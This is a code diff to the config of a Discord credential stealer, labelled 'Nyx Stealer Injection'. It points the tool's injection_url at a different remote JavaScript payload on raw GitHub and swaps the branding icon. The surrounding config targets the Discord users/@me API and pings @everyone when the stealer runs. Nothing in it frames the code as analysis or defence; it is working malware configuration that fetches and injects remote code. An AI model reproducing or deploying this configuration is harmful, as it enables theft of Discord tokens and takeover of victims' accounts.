@@ -12,9 +12,9 @@ const config = {
   ping_on_run: true, 
   ping_val: '@everyone', 
   embed_name: 'Nyx Stealer Injection', 
-  embed_icon: 'https://i.hizliresim.com/6t31tw2.jpg', 
+  embed_icon: 'https://cdn.discordapp.com/attachments/1185265069798465626/1270140493078069309/nyxstealer.png?ex=67cd67c3&is=67cc1643&hm=c3c8808a27fe0aacd15640a948684b4998cddaebb51c6afd5ab77fd2406d84a1&', 
   embed_color: 0, 
-  injection_url: 'https://raw.githubusercontent.com/quicaxd/Exela-V2.0/main/injection/injection.js', 
+  injection_url: 'https://raw.githubusercontent.com/bomboclat-cyber/injectionx/refs/heads/main/in.js', 
 
   api: 'https://discord.com/api/v9/users/@me',
   nitro: {
